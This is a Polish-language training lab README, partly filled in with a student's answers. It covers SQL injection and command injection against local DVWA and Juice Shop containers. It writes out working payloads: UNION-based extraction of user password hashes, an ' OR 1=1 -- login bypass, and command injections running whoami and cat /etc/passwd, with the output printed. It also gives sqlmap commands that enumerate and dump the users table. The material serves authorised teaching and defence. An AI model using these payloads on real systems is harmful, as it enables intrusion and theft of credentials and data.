# Lab 24 — SQL Injection i Command Injection

## Cel laboratorium

Celem laboratorium jest przejście przez kompletny, kontrolowany scenariusz podatności Injection w środowisku lokalnym. Student zacznie od ręcznej identyfikacji SQL Injection w DVWA, przejdzie przez podstawową eksfiltrację UNION-based, zobaczy Command Injection, użyje SQLMap do automatyzacji, a na końcu porówna podatny kod z podejściem defensywnym.

Po wykonaniu ćwiczenia student powinien:

- rozumieć różnicę między SQL Injection a Command Injection,
- umieć wskazać punkt wejścia podatny na SQLi,
- umieć wykonać podstawowy test manualny w DVWA,
- rozumieć, czym różni się normalna odpowiedź od odpowiedzi podatnej,
- umieć użyć SQLMap w lokalnym, autoryzowanym labie,
- rozumieć znaczenie cookie sesyjnego w testach aplikacji webowej,
- umieć opisać wpływ podatności
- wskazać właściwe mechanizmy obrony: parametryzacja, prepared statements, ORM, allow-list, unikanie `shell=True`.

## Zasady bezpieczeństwa

Ćwiczenia wykonujemy wyłącznie lokalnie na środowisku laboratoryjnym z poprzedniej lekcji.

Dozwolone:

- testowanie DVWA na `127.0.0.1:8080`,
- testowanie Juice Shop na `127.0.0.1:3000`,
- używanie SQLMap wyłącznie wobec lokalnego DVWA,
- wykonywanie poleceń opisanych w tym labie,
- zapisywanie notatek technicznych w szablonie z katalogu `materials/`.

Niedozwolone:

- uruchamianie SQLMap na cudzych domenach,
- testowanie aplikacji bez zgody właściciela,
- wykonywanie destrukcyjnych komend systemowych,
- pobieranie lub zapisywanie prawdziwych danych osobowych,
- commitowanie plików zawierających prawdziwe cookie, tokeny lub sesje,
- rozszerzanie testów poza zakres wskazany przez prowadzącego.

Ten lab jest celowo praktyczny, ale ma uczyć profesjonalnego procesu. Każdy test powinien mieć cel, obserwację i wniosek.

## Wymagania techniczne

Zakładamy, że DVWA i Juice Shop zostały już pobrane oraz uruchamiane w poprzednim labie.

Wymagane:

- Docker Desktop albo Docker Engine,
- działające kontenery z labu 23 albo możliwość ich uruchomienia,
- przeglądarka z DevTools,
- terminal,
- SQLMap,
- opcjonalnie Burp Suite Community albo OWASP ZAP.

Docelowe adresy:

| Aplikacja | Adres |
|---|---|
| DVWA | `http://127.0.0.1:8080` |
| Juice Shop | `http://127.0.0.1:3000` |

Jeżeli używasz innego portu dla DVWA lub Juice Shop, konsekwentnie dostosuj adresy w komendach.

## Pliki w tym katalogu

```text
content/24/lab/
├── README.md
├── materials/
│   ├── expected-results.md
│   ├── incident-report-template.md
│   └── lab-notes-template.md
└── references/
    ├── dvwa-sqli-cheatsheet.md
    ├── sqlmap-cheatsheet.md
    └── defense-checklist.md
```

## Etap 1 — sprawdzenie środowiska

Sprawdź, czy Docker działa:

```bash
docker ps
```
CONTAINER ID   IMAGE                           COMMAND                  CREATED       STATUS                            PORTS                                                NAMES
467b47e8a2bd   ghcr.io/digininja/dvwa:latest   "docker-php-entrypoi…"   2 days ago    Restarting (255) 48 seconds ago                                                        lab26kali-dvwa-1
b4b562e01260   mariadb:10                      "docker-entrypoint.s…"   2 days ago    Up 4 hours                        3306/tcp                                             lab26kali-db-1
dd81e491d6da   webgoat/webgoat                 "java -Duser.home=/h…"   10 days ago   Up 4 hours (unhealthy)            127.0.0.1:8081->8080/tcp, 127.0.0.1:9091->9090/tcp   lab23-webgoat
88198fdfc025   bkimminich/juice-shop           "/nodejs/bin/node /j…"   10 days ago   Up 4 hours                        127.0.0.1:3000->3000/tcp                             lab23-juice-shop
729ce32df9d5   vulnerables/web-dvwa            "/main.sh"               10 days ago   Up 4 hours                        127.0.0.1:8080->80/tcp                               lab23-dvwa

Jeżeli kontenery z labu 23 nie są uruchomione, przejdź do katalogu `content/23/lab` i uruchom środowisko:

```bash
cd ../23/lab
docker compose up -d
```

Jeżeli pracujesz z katalogu głównego repozytorium:

```bash
cd content/23/lab
docker compose up -d
```

Sprawdź, czy aplikacje odpowiadają:

```text
http://127.0.0.1:8080 - tak
http://127.0.0.1:3000 - tak
```

Oczekiwany rezultat:

- DVWA pokazuje ekran logowania lub stronę setup,
- Juice Shop ładuje aplikację sklepu,
- środowisko nie jest wystawione publicznie.

## Etap 2 — przygotowanie DVWA

Otwórz:

```text
http://127.0.0.1:8080
```
OK

Zaloguj się do DVWA:

```text
Username: admin
Password: password
```
OK
Jeżeli DVWA wymaga inicjalizacji bazy:

1. przejdź do `Setup / Reset DB`,
OK
2. kliknij przycisk tworzenia lub resetowania bazy,
OK
3. zaloguj się ponownie.
OK

Następnie ustaw poziom bezpieczeństwa:

1. przejdź do `DVWA Security`,
2. wybierz poziom `Low`,
3. zapisz ustawienie.

Zrobione.

Oczekiwany rezultat:

- użytkownik jest zalogowany,
- poziom bezpieczeństwa DVWA to `Low`,
- można wejść w moduł `SQL Injection`.

## Etap 3 — obserwacja normalnego działania SQL Injection w DVWA

Przejdź do:

```text
DVWA -> SQL Injection
```

W pole `User ID` wpisz:

```text
1
```

Zapisz w notatkach:

- jaki rekord został zwrócony,
- czy aplikacja pokazuje imię i nazwisko,
- czy odpowiedź wygląda poprawnie,
- czy w URL pojawił się parametr `id`.

Następnie wpisz:

```text
2
```

Porównaj odpowiedź z poprzednią.

Cel tego etapu:

- zrozumieć normalny przepływ,
- potwierdzić, że parametr `id` wpływa na zapytanie do bazy,
- mieć punkt odniesienia przed testem podatności.

## Etap 4 — podstawowy test logiczny SQL Injection

W polu `User ID` wpisz:

```text
1' OR '1'='1
```

Zapisz obserwację:

- czy aplikacja zwróciła więcej niż jednego użytkownika,
- czy odpowiedź różni się od `id=1`,
- czy wygląda to jak zmiana logiki warunku `WHERE`,
- czy pojawił się błąd SQL.

Wniosek, do którego student powinien dojść:

```text
Parametr User ID prawdopodobnie jest używany w zapytaniu SQL bez bezpiecznej parametryzacji. Wartość wejściowa zmieniła logikę warunku i spowodowała zwrócenie większej liczby rekordów.
```

Nie zatrzymuj się na payloadzie. Opisz mechanizm.

## Etap 5 — UNION-based SQL Injection

W tym etapie student sprawdza, czy da się rozszerzyć wynik zapytania przez `UNION`.

Wpisz:

```text
1' UNION SELECT 1,2 -- 
```

Zapisz:
1' UNION SELECT '1',2' -- 
- czy aplikacja zwróciła dodatkowy wynik,
ID: 1' UNION SELECT '1',2' --
First name: admin
Surname: admin

ID: 1' UNION SELECT '1',2' --
First name: 1
Surname: 2
- gdzie na stronie pojawiają się wartości `1` i `2`,

- ile kolumn prawdopodobnie zwraca oryginalne zapytanie,
2
- które kolumny są widoczne w odpowiedzi.
First Name i Surname

Następnie wpisz:

```text
1' UNION SELECT user, password FROM users -- 
```

Zapisz:

- czy aplikacja zwróciła nazwy użytkowników,
Tak
- czy aplikacja zwróciła hashe haseł,
Tak - sume MD5
- dlaczego tabela `users` jest wrażliwa,
Pozwala nam znalezc konto admina.
- jaki byłby wpływ takiej podatności w realnej aplikacji.
Daje mozliwosc odczytu hashy hasel i porownania hashy z przygotowanym slownikiem. W dodatku konto admin i smithy maja taki sam hasl. Wniosek jest taki,
ze nie uzywaja soli i maja takie same hasla! W dodatku hasla sa przechowywane za pomoca sumy kontrolnej MD5. Ta metoda ulatwia ich odgadniecie! Zaleca sie
algorytmy Argon2 czy bcrypt uzycie soli, wysokiego kosztu obliczeniowego (liczba oteracji lub zyzycia pamieci, czas na wygenerowanie pojedynczego hasha 100 - 300 ms bez wplywau na logowanie a spowalnia atak bruteforce)

Oczekiwany wniosek:

```text
Podatność umożliwia nie tylko zmianę logiki warunku, ale również odczyt danych z tabeli użytkowników przez UNION-based SQL Injection.
```

## Etap 6 — analiza w DevTools

Otwórz DevTools w przeglądarce i przejdź do zakładki `Network`.

Powtórz test z wartością:

```text
1' OR '1'='1
```

Znajdź żądanie HTTP i zapisz:

- metodę HTTP, GET
- pełny URL, http://127.0.0.1:8080/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit
- parametr zawierający wejście użytkownika, id
- kod odpowiedzi, 200 OK
- czy odpowiedź jest HTML, Tak (Type: html)
- czy payload jest widoczny w URL lub parametrach. Payload jest widoczny w URL w parametrze id:
http://127.0.0.1:8080/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#

Cel:

- student ma zobaczyć, że podatność nie jest “magią formularza”,
- payload jest częścią żądania HTTP,
- backend przetwarza parametr i buduje odpowiedź.

## Etap 7 — Command Injection w DVWA

Przejdź do:

```text
DVWA -> Command Injection
```

Najpierw wykonaj normalny test:

```text
127.0.0.1
```

Zapisz:

- czy aplikacja wykonała ping,
Tak
- jak wygląda normalny output,
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.046 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.048 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.050 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.119 ms
--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.046/0.066/0.119/0.031 ms
- czy wynik przypomina output systemowy.
Tak

Następnie w kontrolowanym labie wpisz:

```text
8.8.8.8; whoami
```

Zapisz:

- czy po wyniku ping pojawił się wynik `whoami`, Tak
- z jakiego użytkownika działa proces, www-data
- dlaczego to jest Command Injection, a nie SQL Injection.
Wprowadzony Payload powoduje wykonanie dodatkowego polecenia systemowego "whoami" na serwerze. Nie dochodzi tutaj do manipulacji zapytania SQL.

Następnie wykonaj drugi test:

```text
127.0.0.1 && cat /etc/passwd
```

Zapisz:

- czy aplikacja pokazała zawartość pliku, Tak, w tym informacje o kontach takich jak root, www-data, mysql:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
- dlaczego odczyt pliku systemowego jest poważnym skutkiem,
Atakujacy moze uzyskac niedozwolony dostep do informacji o systemie, jego uzytkownikach. Moze prowadzic do ujawnienia poufnych danych.
- dlaczego w realnych testach nie wolno rozszerzać takich działań bez jasnego zakresu.
Moze to naruszac bezpieczenstwo i poufnosc danych oraz przekraczac udzielone pozwolenia/uprawnienia. Co do zasady testy wykonuje sie w uzgodnionym zakresie.

Nie wykonuj poleceń destrukcyjnych. Nie modyfikuj plików. Nie uruchamiaj skryptów pobieranych z Internetu.

## Etap 8 — przygotowanie SQLMap

Sprawdź, czy SQLMap jest dostępny:

```bash
sqlmap --version
```
sqlmap -version         
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.10.7#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Usage: python3 sqlmap [options]


Jeżeli polecenie nie działa:

- w Kali Linux SQLMap zwykle jest preinstalowany,
- na innym systemie skorzystaj z instrukcji prowadzącego,
- nie instaluj narzędzi globalnie bez zgody prowadzącego, jeśli pracujesz na komputerze firmowym lub szkoleniowym.

Następnie pobierz cookie sesyjne DVWA:

1. w przeglądarce otwórz DVWA,
2. upewnij się, że jesteś zalogowany,
3. otwórz DevTools,
4. przejdź do `Application` / `Storage` / `Cookies` albo odczytaj nagłówek `Cookie` z zakładki `Network`,
5. znajdź `PHPSESSID`, - Znalezione
6. upewnij się, że cookie zawiera również `security=low`. -Potwierdzone

W notatkach zapisz tylko informację, że cookie zostało pobrane. Nie zapisuj prawdziwej wartości sesji w repozytorium.

## Etap 9 — SQLMap: wykrycie podatności

Uruchom SQLMap wobec lokalnego DVWA:

```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_WSTAW_WLASNA_SESJE; security=low" \
  --batch
```

Zastąp `TU_WSTAW_WLASNA_SESJE` wartością swojej sesji.

Zapisz:

- czy SQLMap wykrył podatność,
TAK
- jaki parametr został wskazany,
id (GET)
- jaki typ SQL Injection został wskazany,
boolean-based blind, error-based, time-based blind oraz UNION query
- czy narzędzie rozpoznało silnik bazy danych,
Tak, odpowiedź to MySQL (MariaDB fork)
- czy test dotyczył właściwego endpointu DVWA.
Tak, /vulnerabilities/sqli/ na zabezpieczeniu poziomu Low

Jeżeli SQLMap nie wykrywa podatności, sprawdź:

- czy DVWA jest zalogowane,
- czy `security=low`,
- czy `PHPSESSID` jest aktualne,
- czy adres zawiera port `8080`,
- czy DVWA odpowiada w przeglądarce.

## Etap 10 — SQLMap: enumeracja bazy

Wypisz bazy danych:

```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_WSTAW_WLASNA_SESJE; security=low" \
  --dbs \
  --batch
```

Zapisz:

- jakie bazy zostały wykryte,
dvwa
information_schema
- która baza jest związana z DVWA.
dvwa

Następnie wypisz tabele w bazie `dvwa`:
guestbook
users


```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_WSTAW_WLASNA_SESJE; security=low" \
  -D dvwa \
  --tables \
  --batch
```

Zapisz:

- jakie tabele zostały znalezione,
guestbook
users
- dlaczego tabela `users` jest interesująca z perspektywy bezpieczeństwa.
Przechowuje nazwy użytkowników, nazwy kont i hashe haseł. Ujawnienie oznacza naruszenie poufności danych i możliwe przejęcie tych kont.

## Etap 11 — SQLMap: kolumny i kontrolowany dump

Wypisz kolumny tabeli `users`:

```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_WSTAW_WLASNA_SESJE; security=low" \
  -D dvwa \
  -T users \
  --columns \
  --batch
```

Zapisz:

- nazwy kolumn,
[8 columns]
+--------------+-------------+
| Column       | Type        |
+--------------+-------------+
| user         | varchar(15) |
| avatar       | varchar(70) |
| failed_login | int(3)      |
| first_name   | varchar(15) |
| last_login   | timestamp   |
| last_name    | varchar(15) |
| password     | varchar(32) |
| user_id      | int(6)      |
+--------------+-------------+
- które kolumny są wrażliwe,
user, first_name, last_name, last login
- czy widzisz kolumnę z hasłem lub hashem.
Tak, kolumna password zawiera 32 znakowe hashe MD5.

Następnie wykonaj kontrolowany dump tabeli `users`:

```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_WSTAW_WLASNA_SESJE; security=low" \
  -D dvwa \
  -T users \
  --dump \
  --batch
```

Zapisz:

- jakie dane zostały odczytane,
Odczytano 5 rekordów userów, z danymi kont jak nazwy kont, hashe haseł, dane osobowe. SQLMap podał nam hasła za pomocą brute force.
- dlaczego w realnej aplikacji taki dump byłby działaniem wysokiego ryzyka,
Ujawnia dane użytkowników i hashe haseł za pomocą MD5. W łatwy sposób może to spowodować przejęcie tych kont i rozszerzenie ataków na ten serwer.
- jak ograniczyć dowód podatności w profesjonalnym raporcie.
Nie pozwolić na pobieranie pełnej bazy danych, nie ujawniać haseł i nieautoryzowanych danych.

## Etap 12 — Juice Shop: obejście logowania

Otwórz:

```text
http://127.0.0.1:3000
```

Przejdź do logowania.

W polu e-mail użyj:

```text
' OR 1=1 --
```

W polu hasła wpisz dowolną wartość, np.:

```text
test
```

Zapisz:

- czy logowanie zakończyło się sukcesem,
Tak, zaakceptowano logowane i widzimy komunikat: Login Admin
- na jakiego użytkownika zalogowała się aplikacja,
Zalogowano na konto admin@juice-sh.op - menu Account to potwierdza
- dlaczego jest to przykład problemu z logiką zapytania,
Wprowadzony payload ' OR 1=1 -- zmienil zapytanie SQL. Warunek 1=1 jest zawsze prawdziwy i umozliwil obejscie hasla.
- czym różni się ten przykład od DVWA.
DVWA - pozwalalo na odczyt danych z bazy
Juice Shop - pozwolil ominac logowanie i otrzymac dostep do konta administratora nie znajac jego hasla i loginu

Jeżeli challenge nie działa w Twojej wersji lub konfiguracji Juice Shop, zapisz obserwację i przejdź dalej. Nie zgaduj kolejnych payloadów bez celu — zadaniem jest zrozumienie mechanizmu, nie brute force formularza.

## Etap 13 — perspektywa obrony w DVWA

W DVWA przejdź do:

```text
DVWA Security
```

Zmień poziom bezpieczeństwa z `Low` na `High`.

Wróć do modułu:

```text
SQL Injection
```

Powtórz wcześniejsze testy:

```text
1
1' OR '1'='1
1' UNION SELECT user, password FROM users -- 
```

Zapisz:

- czy zachowanie aplikacji się zmieniło,
Tak, poniewaz na ustawieniu security High uzupelnia sie formularz w osobnym oknie. Aplikacja ogranicza liczbe wynikow (LIMIT 1) i ukrywa bledy SQL.
- czy payload działa tak samo,
Proba paylod 1 oraz logika OR zwrocily dane administratora. Przy tescie payloadu UNION widzimy komunikat "Something went wrong".
- czy aplikacja pokazuje mniej danych,
Tak, dwa testy wyswietlaly tylko dane administratora. Nie udalo sie odczytac dodatkowych danych za pomoca payloadu UNION.
- co to mówi o różnicy między podatną a twardszą implementacją.
Poziom High zwraca tylko 1 odpowiedz z bazy. Utrudnia wyswietlenie danych jak mialo miejsce przy poziomie Low.

Następnie omów z prowadzącym:

- dlaczego prepared statements i parametryzacja rozwiązują główny problem SQLi,
- dlaczego samo ukrycie błędów nie wystarczy,
- dlaczego ORM pomaga tylko wtedy, gdy nie obchodzimy jego zabezpieczeń,
- dlaczego allow-list jest potrzebna dla sortowania i innych elementów strukturalnych.

## Etap 14 — notatka techniczna

Na podstawie szablonu `materials/lab-notes-template.md` przygotuj krótką notatkę.

Notatka ma zawierać:

- nazwę podatności,
- środowisko,
- podatny parametr,
- kroki odtworzenia,
- obserwację,
- wpływ,
- rekomendację,
- informację, które działania były wykonane tylko w labie.

Następnie uzupełnij `materials/incident-report-template.md` w formie mini-raportu.

## Oczekiwany rezultat końcowy

Po zakończeniu labu student ma:

- działające DVWA i Juice Shop,
- potwierdzoną ręcznie podatność SQLi w DVWA,
- wykonany podstawowy przykład UNION-based SQLi,
- zrozumiany przykład Command Injection,
- użyty SQLMap na lokalnym DVWA,
- udokumentowany parametr, wpływ i rekomendację,
- porównaną perspektywę atakującego i obrońcy.

## Sprzątanie po labie

Jeżeli kończysz pracę ze środowiskiem:

```bash
cd content/23/lab
docker compose down
```

Nie zapisuj prawdziwych wartości `PHPSESSID`, tokenów, cookies ani dumpów danych poza lokalnymi notatkami laboratoryjnymi.
